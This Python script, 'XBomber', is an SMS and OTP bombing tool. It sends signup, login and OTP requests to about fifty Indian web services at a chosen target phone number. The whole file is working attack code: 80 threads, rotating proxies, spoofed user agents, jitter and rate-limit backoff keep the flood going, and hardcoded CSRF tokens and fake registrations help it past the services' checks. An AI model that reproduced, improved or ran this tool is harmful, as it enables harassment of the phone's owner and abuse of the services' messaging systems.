#!/usr/bin/env python3


import json
import os
import sys
import random
import time
import threading
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor

import requests 
from requests.adapters import HTTPAdapter

# ========================== GLOBALS =========================================
VERSION = "3.2.0" 
SERVICES_FILE = "./assets/services.json"
PROXY_FILE = "proxies.txt"

# ========================== COLORS ==========================================
def c(text, code):
    return f"\033[{code}m{text}\033[0m"

def red(text):    return c(text, "91")
def green(text):  return c(text, "92")
def yellow(text): return c(text, "93")
def cyan(text):   return c(text, "96")
def magenta(text):return c(text, "95")
def bold(text):   return c(text, "1")

# ========================== BANNER (unique XBomber style) ===================
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print()
    print("    \033[1;35m#     #\033[0m                                           \033[1;90mv2.0.0\033[0m")
    print("    \033[1;35m #   #  \033[1;36m#####   ####  #    # #####  \033[1;31m###### #####\033[0m  ")
    print("    \033[1;35m  # #   \033[1;36m#    # #    # ##  ## #    # \033[1;31m#      #    #\033[0m ")
    print("    \033[1;35m   #    \033[1;36m#####  #    # # ## # #####  \033[1;31m#####  #    #\033[0m ")
    print("    \033[1;35m  # #   \033[1;36m#    # #    # #    # #    # \033[1;31m#      #####\033[0m  ")
    print("    \033[1;35m #   #  \033[1;36m#    # #    # #    # #    # \033[1;31m#      #   #\033[0m  ")
    print("    \033[1;35m#     # \033[1;36m#####   ####  #    # #####  \033[1;31m###### #    #\033[0m ")
    print()
    print("    \033[1;33m              Created by Alienkrishn [Anon4You]\033[0m   ")
    print("    \033[1;34m              Telegram: https://t.me/nullxvoid\033[0m     ")
    print()
    print("  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m")
    print("  \033[1;41m\033[1;37mㅤ    DISCLAIMER: Developer will not be responsible       ㅤ\033[0m")
    print("  \033[1;41m\033[1;37mㅤ    for any misuse or damage caused by this script      ㅤ\033[0m")
    print("  \033[1;41m\033[1;37mㅤ    Please do not use this script for taking Revenge    ㅤ\033[0m")
    print("  \033[1;41m\033[1;37mㅤ    Use this tool for educational purposes only         ㅤ\033[0m")
    print("  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m")
    print()

# ========================== LOAD SERVICES (once) ============================
_services_cache = None

def load_services():
    global _services_cache
    if _services_cache is not None:
        return _services_cache
    if not os.path.exists(SERVICES_FILE):
        print(red(f"\n[!] {SERVICES_FILE} not found. Cannot continue."))
        sys.exit(1)
    try:
        with open(SERVICES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        services = data.get("services", [])
        if not services:
            print(red("[!] No services found in config."))
            sys.exit(1)
        _services_cache = services
        return services
    except Exception as e:
        print(red(f"[!] Failed to load services: {e}"))
        sys.exit(1)

# ========================== PAYLOAD BUILDER ============
class PayloadBuilder:
    @staticmethod
    def build(api_name, phone, phone91, phone_plus):
        payloads = {
            'Gokwik 1': lambda: {"phone": phone, "country": "IN"},
            'Gokwik 2': lambda: {"phone": phone, "country": "IN"},
            'Noise': lambda: {"value": phone, "type": "phone"},
            'Gokwik Validate': lambda: {
                "cart_id": 592470021,
                "mid": "3mt5u7utwrl35l6ssa",
                "os_type": "Windows",
                "request_id": "e3673140-db47-425b-81b9-55ef26491207",
                "phone": phone,
                "origin": "CORE_FE"
            },
            '1mg': lambda: {"mobile_number": phone, "source": "DWEB_PHARMA_HOME"},
            'PocketFM': lambda: [{"phone_number": phone_plus, "country_code": "+91"}],
            'Zee5': lambda: {"phoneno": phone91},
            'Shemaroome': lambda: f"mobile_no={phone_plus}&registration_source=organic",
            'DishTV': lambda: {
                "mobile": phone91,
                "password": "123456",
                "additional_params": {"isOptedForPromotions": "true"}
            }, 
            'Epicon': lambda: f"_token=&stdisdcode=%2B91&mobile_number={phone}&signup_method=MOBILE",
            'VRott TV': lambda: {"phno": phone91},
            'Hoichoi': lambda: {"phoneNumber": phone_plus, "platform": "MOBILE_WEB"},
            'MooviPlay': lambda: {"phone_number": phone},
            'GoodTimesLeague Signup': lambda: {
                "name": "you", "mobile": phone, "state": "Delhi", "age": 99,
                "age_consent": True, "receive_consent": True, "tnc_consent": True,
                "utm_source": "Direct", "utm_medium": "Direct", "utm_campaign": "Direct"
            },
            'GoodTimesLeague Login': lambda: {
                "mobile": phone, "utm_source": "Direct", "utm_medium": "Direct", "utm_campaign": "Direct"
            },
            'Mastram Register': lambda: {
                "age_above_18": "true", "email": "crackimngschool@gmail.com",
                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
                "terms_conditions_agreed": "true"
            },
            'Jalwatv Register': lambda: {
                "age_above_18": "true", "email": "crackimngschool@gmail.com",
                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
                "terms_conditions_agreed": "true"
            },
            'Joshplay Register': lambda: {
                "age_above_18": "true", "email": "crackimngschool@gmail.com",
                "full_name": "XIRVY", "phone": phone, "phone_code": "+91",
                "terms_conditions_agreed": "true"
            },
            'Cloudways OTP': lambda: f"phone_no={phone}",
            'Mastram Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
            'Jalwatv Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
            'Joshplay Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
            'Unistreams Send OTP': lambda: {"phone": phone, "phone_code": "+91"},
            'Dramelle SMS': lambda: {
                "number": [phone],
                "message": "Your Dramelle OTP for verification is 696969",
                "senderId": "EDUMRC",
                "templateId": "1707168926925165526"
            },
            'Reelzify': lambda: {"phone": phone, "countryCode": "+91"},
            'Redrob': lambda: {"type": "phone", "identifier": phone_plus},
            'Pepperly': lambda: {
                "csrfmiddlewaretoken": "szmDBiLg71U77r8QAbCFlqMjiB2rBGK3H0DiKrJmNLbYphE9RXeXN5FGG6DhnSb7",
                "next": "", "country_code": "+91", "phone": phone
            },
            'JourneyChoice': lambda: {
                "_csrf": "83942e1b6210ca803bd508cb515d77cd2c38a0d969f5da4b1e39ee234cd37ca8",
                "mobile_number": phone, "return_to": "/user/dashboard"
            },
            'Bankend Services': lambda: {"phone": phone_plus},
            'Sabbkuch': lambda: {"action": "sendOtp", "to": phone_plus, "channel": "voice", "otpLength": 6},
            'Penpencil Resend OTP': lambda: {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"},
            'Starquik OTP': lambda: f"------WebKitFormBoundaryUN4i0M1ArwauXUif\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{phone_plus}\r\n------WebKitFormBoundaryUN4i0M1ArwauXUif--",
            'Kinre OTP': lambda: {"phone": phone},
            'RKBazar Mobile OTP': lambda: {
                "username": phone_plus, "type": "mobile", "domain": "rkbazar.in", "language_code": "en"
            },
            'RKBazar WhatsApp OTP': lambda: {
                "username": phone_plus, "type": "whatsapp", "domain": "rkbazar.in", "language_code": "en"
            },
            'Sitaram Diwanchand OTP': lambda: f"csrf_token=c8c585827c8c8afe27e459f9953213fc&mobile={phone}",
            'Mpaani OTP': lambda: {"phone_number": phone, "role": "CUSTOMER"},
            'Bharatgo OTP': lambda: {
                "country_code": "+91", "mobile": phone, "source": "WEB", "role": "VENDOR", "loginType": "REGISTER"
            },
            'Nlincs OTP': lambda: {
                "path": "/auth/otp", "headers": [["partner_id", "nstore"]],
                "method": "post", "body": {"partner": "nstore", "name": "xxx", "phone": phone}
            },
            'Gracedaily Signup': lambda: {
                "name": "cracking school1", "email": f"{random.randint(1000,9999)}@gmail.com",
                "mobile": phone, "password": ""
            },
            'Gracedaily Send OTP': lambda: {"mobileNo": phone},
            'Aditi Mistry Mobile Verification': lambda: {"isd_code": "91", "mobile_no": phone, "isRole": "user"},
            'Newbo Verify Phone': lambda: {},
            'Fridaay Customer Signup': lambda: {"user_name": phone},
            'Datarott Send OTP': lambda: f"login_type=mobile&county_code=91&mobile_no={phone}",
            'Navrangott Login': lambda: {"username": phone},
            'India Genius Challenge': lambda: {"phoneNumber": phone_plus},
            'Hercules Premier League': lambda: f"phone={phone}",
            'Playzhub': lambda: {"phone_number": phone, "country_code": "+91"},
            'Papapa': lambda: {"phone_no": {"prefix": "+91", "number": phone}, "source": "wallet"},
            'Woohoo': lambda: {"value": phone_plus, "token": "", "captchaResponse": "", "captchaType": "V3"},
            'CDM IPL': lambda: {"mobile": phone},
            'Lambda OTP': lambda: {"phone_number": phone, "qr_id": "696969", "pincode": "696969", "name": "cracking school"}
        }
        builder = payloads.get(api_name)
        return builder() if builder else None

# ========================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, proxy_file=PROXY_FILE, enabled=False):
        self.proxy_file = proxy_file
        self.enabled = enabled
        self.proxies = []
        self.proxy_cycle = None
        self.lock = threading.Lock()
        self.load()

    def load(self):
        if not self.enabled:
            return False
        if not os.path.exists(self.proxy_file):
            self.enabled = False
            return False
        try:
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            if not self.proxies:
                self.enabled = False
                return False
            self.proxy_cycle = cycle(self.proxies)
            return True
        except:
            self.enabled = False
            return False

    def get_next(self):
        if not self.enabled or not self.proxy_cycle:
            return None
        with self.lock:
            proxy = next(self.proxy_cycle)
            return {"http": proxy, "https": proxy}

    def enable(self):
        self.enabled = True
        self.load()

    def disable(self):
        self.enabled = False

# ========================== REQUEST ENGINE (thread‑local, no delays here) ===
_thread_local = threading.local()

def get_session():
    if not hasattr(_thread_local, "session"):
        _thread_local.session = requests.Session()
        adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=0)
        _thread_local.session.mount('http://', adapter)
        _thread_local.session.mount('https://', adapter)
    return _thread_local.session

# ========================== BOMBER CORE ======
class BomberCore:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.services = load_services()          # loaded once
        self.rate_limited = {}
        self.rate_lock = threading.Lock()
        self.success = 0
        self.count_lock = threading.Lock()
        self.running = False
        self.reg_state = {'mastram': False, 'jalwatv': False, 'joshplay': False, 'gracedaily': False}
        self.max_workers = 80                    # balanced for speed + reliability
        self.backoff = 30
        self.delay_min = 0.08                    # jitter to avoid rate limits
        self.delay_max = 0.25
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G9980) AppleWebKit/537.36",
            "Dart/3.0 (dart:io)",
            "okhttp/4.9.1",
        ] 

    def _get_ua(self):
        return random.choice(self.user_agents)

    def _update_reg_state(self, api_name):
        
        if api_name == 'Mastram Register':
            if not self.reg_state['mastram']:
                self.reg_state['mastram'] = True
                return None
            return 'Mastram Send OTP'
        elif api_name == 'Jalwatv Register':
            if not self.reg_state['jalwatv']:
                self.reg_state['jalwatv'] = True
                return None
            return 'Jalwatv Send OTP'
        elif api_name == 'Joshplay Register':
            if not self.reg_state['joshplay']:
                self.reg_state['joshplay'] = True
                return None
            return 'Joshplay Send OTP'
        elif api_name == 'Gracedaily Signup':
            if not self.reg_state['gracedaily']:
                self.reg_state['gracedaily'] = True
                return None
            return 'Gracedaily Send OTP'
        return api_name

    def _special_logic(self, service, phone, phone91, phone_plus):
        if service['name'] == 'GoodTimesLeague Signup':
            payload = PayloadBuilder.build(service['name'], phone, phone91, phone_plus)
            session = get_session()
            headers = service['headers'].copy()
            headers['User-Agent'] = self._get_ua()
            proxies = self.proxy_manager.get_next()
            try:
                resp = session.post(service['url'], headers=headers, json=payload, timeout=6, proxies=proxies)
                if resp.status_code in (200,201,202,204):
                    return True
                if resp.status_code == 400:
                    # find login service
                    login_svc = next((s for s in self.services if s['name'] == 'GoodTimesLeague Login'), None)
                    if login_svc:
                        login_payload = PayloadBuilder.build('GoodTimesLeague Login', phone, phone91, phone_plus)
                        headers2 = login_svc['headers'].copy()
                        headers2['User-Agent'] = self._get_ua()
                        resp2 = session.post(login_svc['url'], headers=headers2, json=login_payload, timeout=6, proxies=proxies)
                        return resp2.status_code in (200,201,202,204)
                return False
            except:
                return False
        return None

    def send_bomb(self, service, phone, phone91, phone_plus):
        with self.rate_lock:
            if service['name'] in self.rate_limited and time.time() < self.rate_limited[service['name']]:
                return False

        new_name = self._update_reg_state(service['name'])
        if new_name is None:
            pass
        elif new_name != service['name']:
            for svc in self.services:
                if svc['name'] == new_name:
                    service = svc
                    break

        payload = PayloadBuilder.build(service['name'], phone, phone91, phone_plus)
        if payload is None:
            return False

        special = self._special_logic(service, phone, phone91, phone_plus)
        if special is not None:
            return special

        session = get_session()
        headers = service['headers'].copy()
        headers['User-Agent'] = self._get_ua()
        proxies = self.proxy_manager.get_next()

        try:
            if service['method'] == 'POST':
                if isinstance(payload, str):
                    resp = session.post(service['url'], headers=headers, data=payload, timeout=6, proxies=proxies)
                else:
                    resp = session.post(service['url'], headers=headers, json=payload, timeout=6, proxies=proxies)
            else:
                resp = session.get(service['url'], headers=headers, timeout=6, proxies=proxies)

            if resp.status_code in (429,403,401):
                with self.rate_lock:
                    self.rate_limited[service['name']] = time.time() + self.backoff
                return False
            return resp.status_code in (200,201,202,204)
        except Exception:
            return False

    def worker(self, phone, phone91, phone_plus):
        while self.running:
            service = random.choice(self.services)
            try:
                if self.send_bomb(service, phone, phone91, phone_plus):
                    with self.count_lock:
                        self.success += 1
            except:
                pass
            # Random delay + jitter to avoid being blocked
            time.sleep(random.uniform(self.delay_min, self.delay_max))

    def start_attack(self, target):
        self.running = True
        self.success = 0
        phone = target
        phone91 = f"91{target}"
        phone_plus = f"+91{target}"
        start = time.time()
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = [ex.submit(self.worker, phone, phone91, phone_plus) for _ in range(self.max_workers)]
            # Animated progress bar (wave + moving bar)
            try:
                spinner = cycle(['◐','◓','◑','◒'])
                bar_len = 30
                last_count = 0
                while self.running:
                    # Dynamic progress bar that pulses based on count increments
                    pct = (self.success % 100) / 100
                    filled = int(bar_len * pct)
                    bar = '█' * filled + '░' * (bar_len - filled)
                    sys.stdout.write(f"\r{cyan('▶')} {green(next(spinner))} {magenta('💣')} {self.success} sent {cyan(bar)}")
                    sys.stdout.flush()
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.stop()
            finally:
                for f in futures:
                    f.cancel()
        elapsed = time.time() - start
        return self.success, elapsed

    def stop(self):
        self.running = False

# ========================== UI FUNCTIONS ====================================
def get_target():
    while True:
        num = input(green("\nEnter target number: ")).strip()
        num = ''.join(filter(str.isdigit, num))
        if len(num) == 10:
            return num
        elif len(num) == 12 and num.startswith('91'):
            return num[2:]
        else:
            sys.stdout.write(red("\r[✗] Invalid! 10 digits required.\n"))
            time.sleep(0.8)

def configure_proxy(bomber):
    choice = input(cyan("\n[?] Use HTTP proxies? (y/n): ")).strip().lower()
    if choice in ('y','yes'):
        bomber.proxy_manager.enable()
        if not bomber.proxy_manager.proxies:
            print(yellow("[!] No proxies loaded. Continuing without proxies."))
            bomber.proxy_manager.disable()
        else:
            print(green(f"[✓] Proxies enabled ({len(bomber.proxy_manager.proxies)} loaded)."))
    else:
        bomber.proxy_manager.disable()
        print(yellow("[!] Proxies disabled."))
    time.sleep(1)

def start_bombing():
    bomber = BomberCore()
    configure_proxy(bomber)
    target = get_target()
    print(red(f"\n🎯 Target locked: {target}\n"))
    print(yellow("▶  Bombing started (Ctrl+C to stop)\n"))
    total, elapsed = bomber.start_attack(target)
    print()  # newline after progress bar
    # Detailed summary
    mins, secs = divmod(int(elapsed), 60)
    rate = total / elapsed if elapsed > 0 else 0
    print(red("\n╔═══════════════════════════════════════════════════════════╗"))
    print(bold("║                     B O M B   S U M M A R Y                     ║"))
    print(red("╠═══════════════════════════════════════════════════════════╣"))
    print(green(f"║  Target number    : {target:<45}║"))
    print(green(f"║  Bombs sent       : {total:<45}║"))
    print(green(f"║  Duration         : {mins}m {secs}s{' ' * (38 - len(str(mins)) - len(str(secs)))}║"))
    print(green(f"║  Requests/second  : {rate:.1f}{' ' * (38 - len(str(round(rate,1))))}║"))
    print(green(f"║  Active threads   : {bomber.max_workers:<45}║"))
    print(green(f"║  Delay per request: {bomber.delay_min:.2f}–{bomber.delay_max:.2f}s{' ' * (27)}║"))
    print(red("╚═══════════════════════════════════════════════════════════╝"))
    input(yellow("\nPress Enter to return to menu..."))

def about():
    services = load_services()
    print(cyan("\n╔═══════════════════════════════════════════════════════════╗"))
    print(cyan("║                        A B O U T                            ║"))
    print(cyan("╠═══════════════════════════════════════════════════════════╣"))
    print(f"║  Version       : {VERSION:<47}║")
    print(f"║  Author        : Alienkrishn [Anon4You]                       ║")
    print(f"║  Telegram      : https://t.me/nullxvoid                       ║")
    print(f"║  Services      : {len(services)} APIs loaded from {SERVICES_FILE:<25}║")
    print(f"║  Proxy support : Yes (proxies.txt)                            ║")
    print(f"║  Rate limiting : Auto backoff (30s)                           ║")
    print(f"║  Jitter        : {0.08}–{0.25}s random delay                   ║")
    print(cyan("╚═══════════════════════════════════════════════════════════╝"))
    input(yellow("\nPress Enter to return..."))

def main_menu():
    while True:
        banner()
        print("  " + cyan("1.") + " Start Bombing")
        print("  " + cyan("2.") + " About")
        print("  " + cyan("3.") + " Exit")
        print()
        choice = input(green("Select option: ")).strip()
        if choice == '1':
            start_bombing()
        elif choice == '2':
            about()
        elif choice == '3':
            print(red("\nExiting XBomber. Goodbye.\n"))
            sys.exit(0)
        else:
            print(red("Invalid option. Press Enter to continue."))
            input()

# ========================== ENTRY POINT =====================================
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(red("\n\nInterrupted. Exiting..."))
        sys.exit(0)